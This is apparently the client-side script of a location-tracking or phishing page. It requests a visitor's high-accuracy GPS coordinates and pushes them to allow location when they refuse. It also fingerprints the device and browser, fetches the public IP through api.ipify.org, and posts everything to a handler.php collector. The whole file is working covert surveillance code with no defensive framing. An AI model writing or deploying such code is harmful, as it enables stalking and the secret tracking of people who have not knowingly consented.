function locate() {
    if (navigator.geolocation) {
        var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
        navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
    }
    else {
        alert('Geolocation is not Supported by your Browser...');
    }

    function showPosition(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        $.ajax({
            type: 'POST',
            url: 'handler.php',
            data: { "data": `https://google.com/maps/place/${lat}+${lon}` },
            success: function(){},
            mimeType: 'text'
        });
        alert('Good 4 U');
    };
}

function showError(error) {
    switch (error.code) {
        case error.PERMISSION_DENIED:
            var denied = 'User denied the request for Geolocation';
            alert('Please Refresh This Page and Allow Location Permission!');
            break;
        case error.POSITION_UNAVAILABLE:
            var unavailable = 'Location information is unavailable!';
            break;
        case error.TIMEOUT:
            var timeout = 'The request to get user location timed out';
            alert('Please Set Your Location Mode on High Accuracy!');
            break;
        case error.UNKNOWN_ERROR:
            var unknown = 'An unknown error occurred';
            break;
    }

    $.ajax({
        type: 'POST',
        url: 'error.php',
        data: { Denied: denied, Una: unavailable, Time: timeout, Unk: unknown },
        success: function(){},
        mimeType: 'text'
    });
}

function getData() {

    locate();


    var client = new ClientJS(); // Create A New Client Object
    var OS = client.getOS(); // Get OS Version
    var ver = client.getOSVersion(); // Get OS Version
    var getbrow = client.getBrowser(); // Get Browser
    var getbrowVer = client.getBrowserVersion(); // Get Browser Version
    var CPU = client.getCPU(); // Get CPU Architecture
    var currentResolution = client.getCurrentResolution(); // Get Current Resolution
    var language = client.getLanguage(); // Get User Language
    var timeZone = '';

    var core = navigator.hardwareConcurrency;
    var check_brave = navigator.brave;

    try {
        timeZone = client.getTimeZone(); // Get Time Zone
    } catch {
        timeZone = 'Not Found';
    }

    timeZone = timeZone.toString();

    if (check_brave == undefined) {
        $.get("https://api.ipify.org", function(data) {
            var ip = data
            $.ajax({
                type: 'POST',
                url: 'handler.php',
                data: { "data": `ip : ${ip} \nos name : ${OS} \nVersion : ${ver} \nBrowser Name : ${getbrow} \nGet Browser Version : ${getbrowVer} \nCpu Name : ${CPU} \nResolution : ${currentResolution} \nTime Zone : ${timeZone} \nLanguage :  ${language} \nNumber Of CPU Core :  ${core}` },
                mimeType: 'text'
            });
        });
    }

    else {
        $.ajax({
            type: 'POST',
            url: 'handler.php',
            data: { "data": `ip : I could not find. Because the browser is a victim of Breave \nos name : ${OS} \nVersion : ${ver} \nBrowser Name : ${getbrow} \nGet Browser Version : ${getbrowVer} \nCpu Name : ${CPU} \nResolution : ${currentResolution} \nTime Zone : ${timeZone} \nLanguage :  ${language} \nNumber Of CPU Core :  ${core}` },
            mimeType: 'text'
        });
    }
}